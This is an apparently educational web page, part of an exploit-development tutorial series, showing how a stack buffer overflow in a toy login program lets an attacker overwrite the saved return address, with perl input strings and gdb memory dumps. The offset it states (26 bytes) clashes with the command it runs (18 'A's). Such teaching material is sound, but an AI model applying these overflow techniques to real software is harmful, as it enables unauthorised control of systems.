<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <!-- The above 3 meta tags *must* come first in the head; any other head content must come *after* these tags -->
    <meta name="description" content="">
    <meta name="keywords" content="">
    <title>BlueHood - Cyber Security Learning</title>
    <!-- Bootstrap -->
    <link href="../css/bootstrap.min.css" rel="stylesheet">
    <!-- Style CSS -->
    <link href="../css/styles.css" rel="stylesheet">
    <!-- Google Fonts -->
    <link href="https://fonts.googleapis.com/css?family=Nunito+Sans:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=PT+Serif:400,400i,700,700i" rel="stylesheet">
    <!-- FontAwesome CSS -->
    <link rel="stylesheet" type="text/css" href="../css/fontello.css">
    <link href="../css/font-awesome.min.css" rel="stylesheet">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
</head>

<body>
    <div class="header-wrapper">
        <div class="container">
            <div class="row">
                <div class="col-lg-2 col-md-2 col-sm-12 col-xs-12">
                    <a href="index.html"><img src="../images/logo2.png" alt="" style="width:75px;height:75px;" class="alignright"></a>
                </div>
                <div class="col-lg-8 col-md-10 col-sm-12 col-xs-12">
                    <div class="navigation">
                        <div id="navigation">
                            <ul>
                                <li class="active"><a href="../index.html" title="Home">Home</a></li>
                                <li class="active"><a href="../pentesting.html" title="Penetration Testing">Penetration Testing</a></li>
                                <li class="active"><a href="../exploitdev.html" title="Exploit Development">Exploit Development</a></li>
                                <li class="active"><a href="../malware.html" title="Malware">Malware</a></li>
                                <li class="active"><a href="../shellcode.html" title="Shellcode">Shellcode</a></li>
                                
                            </ul>
                        </div>
                    </div>
                </div>
                <div class="col-lg-2 hidden-md hidden-sm hidden-xs">
                    <div class="header-btn"><a href="#" class="btn btn-header">get started</a></div>
                </div>
            </div>
        </div>
    </div>
    <!-- header-section close -->
    <!-- page-header-start -->
    <div class="page-header">
        <div class="container">
            <div class="row">
                <div class="col-lg-6 col-md-6 col-sm-6 col-xs-12">
                    <div class="page-section">
                        <h1 class="page-title ">Exploit Devlopment</h1>
                        <h3 class="page-title ">2.2 Controlling Program Execution</h1>
                        <div class="page-breadcrumb">
                            <ol class="breadcrumb">
                                <li><a href="../exploitdev.html">Exploit Development</a></li>
                                <li>2. Stack Based Buffer Overflows</li>
                                <li>2.2 Controlling Program Execution</li>
                            </ol>
                        </div>
                    </div>
                </div>
                <div class="col-lg-6 col-md-6 col-sm-6 hidden-xs">
                    <div class="page-section">
                         <p> Previously we saw how we can alter the logic of a program to produce some unintended consequences. We managed to force the program to log us in without a valid password by overwriting the value returned by the check_password function. Whilst this is brilliant it is not always easy to reliably do this for all programs and in some cases not possible without crashing the program. In this post, we will take a more general approach. We will overwrite the RET address on the Stack. This will allow us load a memory address of our choosing into EIP once the function returns. From here we will be able to control the execution of the program.  </p>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <!-- page-header-close -->
    <div class="space-medium">
        <div class="container">
            <div class="row">
                <div class="col-lg-8 col-md-8 col-sm-8 col-xs-12">
                    <div class="row">
                        <div class="col-lg-12 col-sm-12 col-md-12 col-xs-12">
                            <div class="post-block">
                                <!-- post holder -->
                                <div class="post-img">
                                    <!-- post img -->
                                    <a href="#" class="imghover"><img src="images/post-img-1.jpg" alt="" class="img-responsive"></a>
                                </div>
                                <!-- /.post img -->
                                <div class="post-content">
                                    <!-- post content -->
                                    <div class="post-header">

                                    </div>
                                    <!-- /.post header -->
                                    <p style="color: red;">All the content on this website, including this post, is intended for educational use only. The techniques and processes presented should only be used against systems you own or have explicit written permission to target. Otherwise, you are breaking the Law - be smart. The author/s of this website will not accept any liability for misuse of this content.</p>
                                    <br>
                                    <img src="./images/2-2-meme.jpg" style="display:block; margin-right: auto; margin-left: auto;">
                                    <br><br>
                                    <h2> Let's Back Up First </h2>

                                    <p>Before we continue let's analyse exactly what happened in the last post. We overwrote a buffer of 10 bytes by supplying an input of length 11 bytes. In doing so we changed the value returned by the check_password function. This altered the program's logic; the program normally logs you in the value returned is not zero. Since we overwrote the Stack with a non zero value for the return value we get logged in. </p>
                                    <p>Let's analyse the Stack frame in more detail. </p>
                                    <img src="./images/2-2-functions_stack_frame.jpg" style="display:block; margin-right: auto; margin-left: auto;">
                                    <p style="font-size: 15px; text-align: center;"> Function's Stack frame loaded onto the Stack.</p>
                                    <p>Firstly the parameters of the function are pushed to the Stack; in this case our user input (stored in the local variable userpass). This memory segment has a variable length corresponding to the length of out user input. Next, the return address and contents of EBP are written to the Stack. Finally, space is allocated on the Stack for the local variables used by the function; in this case auth (4 bytes), pass_buffer (10 bytes) and actual_pass (10 bytes). </p>
                                    <p>So what happened to the Stack when we overflowed the pass_buffer buffer by inputting a string of length 11. The last byte of our user input overwrote the buffer allocated to pass_buffer and was written into a portion of memory allocated to the auth variable. </p>
                                    <img src="./images/2-2-stack_frame_overflow.jpg" style="display:block; margin-right: auto; margin-left: auto;">
                                    <p style="font-size: 15px; text-align: center;">Our Stack frame after the strcpy command overflows the pass_buffer buffer.</p>
                                    <p>Now the value of auth is set to “000A” or rather to the decimal value 65. This is what is causing the problem - when auth is returned to main it will have a value of 65 causing the program to log you in. </p>
                                    <h2> That's Cool, But What Next </h2>
                                    <p>This is all well and good but what else can we do? What's to stop us from sending 50 bytes to the program and overwrite other stuff on the Stack? These are all the right questions. Let's send a buffer of 50 bytes to application and see what happens. </p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ ./login $(perl -e 'print "A"x50')
Segmentation fault (core dumped)
debug@lbuntu:~/Documents/exploitdev/chapter2/stack$</pre>
                                    <p>The program crashes. But why does this happen? Let's have a look at the Stack after our 50 byte buffer is copied there. </p>
                                    <img src="./images/2-2-stack_frame_overflow_50.jpg" style="display:block; margin-right: auto; margin-left: auto;">
                                    <p style="font-size: 15px; text-align: center;">This time we overflow the buffer by 40 bytes</p>
                                    
                                    <p>As you can see we have overwritten most of the Stack frame. In particular, we have overwritten the return address with “\x41\x41\x41\x41” or “AAAA”. When the function has executed the program will try to resume execution at “\x41\x41\x41\x41” which is an invalid address. This causes the program to crash. </p>
                                    <p>Let's analyse this in gdb. We set breakpoints before our input is copied into pass_buffer and before the program returns to main. </p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ gdb -q ./login
Reading symbols from ./login...done.
(gdb) break 10
Breakpoint 1 at 0x60a: file login.c, line 10.
(gdb) break 16
Breakpoint 2 at 0x63a: file login.c, line 16.
(gdb) run $(perl -e 'print "A"x50')
Starting program: /home/debug/Documents/exploitdev/chapter2/stack/login $(perl -e 'print "A"x50')

Breakpoint 1, check_password (userpass=0xbffff722 'A' repeats 50 times)
 at login.c:10
warning: Source file is more recent than executable.
10 strcpy(pass_buffer, userpass);
(gdb) x/32xw $esp
0xbffff4b0: 0x00000009  0xbffff6ec  0x6b636168  0x00007265
0xbffff4c0: 0xb7fb0000  0xb7fba000  0x00000000  0x00000000
0xbffff4d0: 0xb7fba3fc  0x00401fc8  0xbffff4f8  <b>0x00400696</b>
0xbffff4e0: 0xbffff722  0xbffff5a4  0xbffff5b0  0x00400656
0xbffff4f0: 0xbffff510  0x00000000  0x00000000  0xb7dfae91
0xbffff500: 0xb7fba000  0xb7fba000  0x00000000  0xb7dfae91
0xbffff510: 0x00000002  0xbffff5a4  0xbffff5b0  0xbffff534
0xbffff520: 0x00000002  0xbffff5a4  0xb7fba000  0xb7fe778a
(gdb) info frame
Stack level 0, frame at 0xbffff4e0:
 eip = 0x40060a in check_password (login.c:10); saved eip = <b>0x400696</b>
 called by frame at 0xbffff510
 source language c.
 Arglist at 0xbffff4d8, args: userpass=0xbffff722 'A' repeats 50 times
 Locals at 0xbffff4d8, Previous frame's sp is 0xbffff4e0
 Saved registers:
 ebx at 0xbffff4d4, ebp at 0xbffff4d8, eip at <b>0xbffff4dc</b>
(gdb) </pre>
                                    <p>At our first breakpoint, we see that our buffer has not yet been copied to the Stack as before. We note that the RET address is located at 0xbffff4dc on the Stack (as indicated using the info frame command and viewing the Saved registers). Thus the return address is currently x00400696, which is pointing back to main. Let's continue execution. </p>
                                    <pre>(gdb) continue
Continuing.

Breakpoint 2, check_password (
 userpass=0x41414141 error: Cannot access memory at address 0x41414141)
 at login.c:16
16 return auth;
(gdb) x/32xw $esp
0xbffff4b0: 0x00000009  0xbffff6ec  0x6b636168  0x00007265
0xbffff4c0: 0x41410000  0x41414141  0x41414141  0x41414141
0xbffff4d0: 0x41414141  0x41414141  0x41414141  <b>0x41414141</b>
0xbffff4e0: 0x41414141  0x41414141  0x41414141  0x41414141
0xbffff4f0: 0x41414141  0x00000000  0x00000000  0xb7dfae91
0xbffff500: 0xb7fba000  0xb7fba000  0x00000000  0xb7dfae91
0xbffff510: 0x00000002  0xbffff5a4  0xbffff5b0  0xbffff534
0xbffff520: 0x00000002  0xbffff5a4  0xb7fba000  0xb7fe778a
(gdb) info frame
Stack level 0, frame at 0xbffff4e0:
 eip = 0x40063a in check_password (login.c:16); saved eip = <b>0x41414141</b>
 called by frame at 0xbffff4e4
 source language c.
 Arglist at 0xbffff4d8, args: 
 userpass=0x41414141 error: Cannot access memory at address 0x41414141
 Locals at 0xbffff4d8, Previous frame's sp is 0xbffff4e0
 Saved registers:
 ebx at 0xbffff4d4, ebp at 0xbffff4d8, eip at <b>0xbffff4dc</b>
(gdb)</pre>
                                    <p>This time the program is in trouble. We have overwritten the return address RET with “\x41\x41\x41\x41”. When the function returns to main "\x41\x41\x41\x41", the contents of the RET address, is loaded into EIP. The program then tries to execute instructions at "\x41\x41\x41\x41", a non-sensical address, and crashes. </p>
                                    <pre>(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) </pre>
                                    <p>So we can crash a program, so what? Since we can overwrite RET we can control where the program begins executing commands after the function has executed. We can choose exactly what is written into RET and thus gain control of the program's execution. </p>
                                    <p>To demonstrate this let's overwrite RET with “BBBB” or “\x42\x42\x42\x42” in hexadecimal. Since we know the structure of the Stack we can do this. The RET address is at an offset of 26 bytes. This is because pass_buffer is 10 bytes, auth is 4 bytes, EBP is 4 bytes and 8 bytes of data put there by the compiler which gives 26 bytes. We will send 26 As followed by 4 Bs to overwrite RET with BBBB.</p>
                                    <pre>debug@lbuntu:~/Documents/exploitdev/chapter2/stack$ gdb -q ./login
Reading symbols from ./login...done.
(gdb) break 16
Breakpoint 1 at 0x63a: file login.c, line 16.
(gdb) run $(perl -e " print 'A'x18 . 'B'x4")
Starting program: /home/debug/Documents/exploitdev/chapter2/stack/login $(perl -e " print 'A'x26 . 'B'x4")

Breakpoint 1, check_password (
 userpass=0xbffff73e 'A' repeats 18 times, "BBBB") at login.c:16
16 return auth;
(gdb) x/32xw $esp
0xbffff4d0: 0x00000009  0xbffff708  0x6b636168  0x00007265
0xbffff4e0: 0x41410000  0x41414141  0x41414141  0x41414141
0xbffff4f0: 0x41414141  0x41414141  0x41414141  <b>0x42424242</b>
0xbffff500: 0xbffff73e  0xbffff5c4  0xbffff5d0  0x00400656
0xbffff510: 0xbffff530  0x00000000  0x00000000  0xb7dfae91
0xbffff520: 0xb7fba000  0xb7fba000  0x00000000  0xb7dfae91
0xbffff530: 0x00000002  0xbffff5c4  0xbffff5d0  0xbffff554
0xbffff540: 0x00000002  0xbffff5c4  0xb7fba000  0xb7fe778a
(gdb) info frame
Stack level 0, frame at 0xbffff500:
 eip = 0x40063a in check_password (login.c:16); saved eip = <b>0x42424242</b>
 called by frame at 0xbffff500
 source language c.
 Arglist at 0xbffff4f8, args: 
 userpass=0xbffff73e 'A' repeats 18 times, "BBBB"
 Locals at 0xbffff4f8, Previous frame's sp is 0xbffff500
 Saved registers:
 ebx at 0xbffff4f4, ebp at 0xbffff4f8, eip at 0xbffff4fc
(gdb) </pre>
                                    <p>We have successfully overwritten RET with 0x42424242! When the program returns from the function the value of RET will be loaded into EIP. This will load 0x42424242 into EIP. The program will then begin executing commands at the memory address in EIP. In our case, the address will be non-sensical and the program will crash. However, we can control the execution flow of the program by specifying the valid address of the next command we want to execute instead of our Bs. </p>
                                    <p>Next time we will force the program to execute code that it did not intend to. We shall not limit ourselves to the instructions available to the program. We will inject our own code into the program in place of our A characters and direct the program back to our code for execution.</p>
                                   
                                

                                    <p>References:<br>
                                    Rob Williams, <a href="https://medium.com/@rwilliams_74049/simple-linux-x86-buffer-overflow-212a9a34866f">https://medium.com/@rwilliams_74049/simple-linux-x86-buffer-overflow-212a9a34866f</a><br>
                                    Ars Technica, How Buffer Overflows work: overwriting the return address <a href="https://www.youtube.com/watch?v=LkqZ8I2FVuQ">https://www.youtube.com/watch?v=LkqZ8I2FVuQ</a>
                                    <!--<img src="images/left-image.jpg" alt="" class="alignleft"> -->
                                    
                                    <!-- <div class="related-post-block">
                                        
                                        <div class="row">
                                            <div class="col-lg-12 col-sm-12 col-md-12 col-sm-12">
                                                <h3 class="related-post-title">Recommended Posts</h3>
                                            </div>
                                        </div>
                                        <div class="row">
                                            <div class="col-lg-6 col-sm-6 col-md-6 col-xs-12">
                                                <div class="related-post">
                                                    
                                                    <div class="related-img">
                                                        <a href="#" class="imghover"><img src="images/related-post-2.jpg" alt="" class="img-responsive"></a>
                                                    </div>
                                                    <div class="related-post-content">
                                                        <h4 class="related-title"><a href="#" class="title">Drinking water dilutes 
stomach acid</a></h4>
                                                        <div class="meta"><span class="meta-categories">in <a href="#" class="">"diet tips"</a> </span></div>
                                                    </div>
                                                </div>
                                               
                                            </div>
                                            <div class="col-lg-6 col-sm-6 col-md-6 col-xs-12">
                                                <div class="related-post">
                                                    
                                                    <div class="related-img">
                                                        <a href="#" class="imghover"><img src="images/related-post-1.jpg" alt="" class="img-responsive"></a>
                                                    </div>
                                                    <div class="related-post-content">
                                                        <h4 class="related-title"><a href="#" class="title">Top 5 natural therapies
to fight hpylori</a></h4>
                                                        <div class="meta"><span class="meta-categories">in <a href="#" class="">"health care</a> </span></div>
                                                    </div>
                                                </div>
                                                
                                            </div>
                                        </div>
                                    </div> -->
                                    <!-- /.related post block -->
                                    <div class="post-navigation">
                                        <!-- post navigation -->
                                        <div class="row">
                                            <div class="nav-links">
                                                <div class="col-md-6 col-sm-6">
                                                    <div class="nav-previous">
                                                        <!-- nav previous -->
                                                        <a href="#" class="prev-link">previous post</a>
                                                        <div class="previous-next-title">
                                                            <h5><a href="#" class="title"></a></h5>
                                                        </div>
                                                    </div>
                                                    <!-- /. nav previous -->
                                                </div>
                                                <div class="col-md-6 col-sm-6">
                                                    <div class="nav-next text-right">
                                                        <!-- nav next -->
                                                        <a href="#" class="next-link">next post</a>
                                                        <div class="previous-next-title">
                                                            <h5><a href="#" class="title"></a></h5>
                                                        </div>
                                                    </div>
                                                    <!-- /.nav previous -->
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                    <!-- /. post navigation -->
                                    
                                    
                                </div>
                                <!-- /.post content -->
                            </div>
                            <!-- /.post holder -->
                        </div>
                    </div>
                </div>
                <div class="col-lg-4 col-md-4 col-sm-4 col-xs-12">
                  
                    
                    <!-- widget-defintions-start -->
                    <!-- widget-definiton-close -->
                    <!-- widget-definiton-close -->
                   
                    
                </div>
            </div>
        </div>
    </div>
    <!-- footer start -->
    <div class="footer">
        <div class="container">
            <div class="row">
                <!-- footer-about-start -->
                
                <!-- footer-useful links-start -->
                <div class=" col-lg-4 col-md-4 col-sm-4 col-xs-12">
                    <div class="footer-widget">
                        <h3 class="footer-title">Quick Links</h3>
                        <ul class="angle angle-right">
                            <li><a href="#">Home </a></li>
                            <li><a href="#">Penetration Testing </a></li>
                            <li><a href="#">Exploit Development</a></li>
                            <li><a href="#">Malware</a></li>
                            <li> <a href="#">Shellcode</a></li>
                            <li> <a href="#">All Topics</a></li>
                        </ul>
                    </div>
                </div>

                 
                <img src="../images/logo3.png" alt="" class="alignright"></a>
                      
                <!-- footer-useful links-close -->
                <!-- footer-form-start -->
                <div class=" col-lg-4 col-md-4 col-sm-4 col-xs-12">
    
                </div>
                <!-- footer-tiny-text-start -->
                <div class="col-lg-12 col-md-12 col-sm-12 col-xs-12">
                    <div class="tiny-footer">
                        <p>© 2020 - BlueHood. All Rights Reserved.</p>
                        <p> See https://easetemplate.com for the Website Template and Other Templates </p>
                    </div>
                </div>
                <!-- footer-tiny-text-start -->
                <!-- footer-form-close -->
            </div>
        </div>
    </div>
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="../js/jquery.min.js" type="text/javascript"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="../js/bootstrap.min.js" type="text/javascript"></script>
    <script src="../js/navigation.js" type="text/javascript"></script>
    <script src="../js/menumaker.js" type="text/javascript"></script>
    <script type="text/javascript" src="../js/jquery.sticky.js"></script>
    <script type="text/javascript" src="../js/sticky-header.js"></script>
</body>

</html>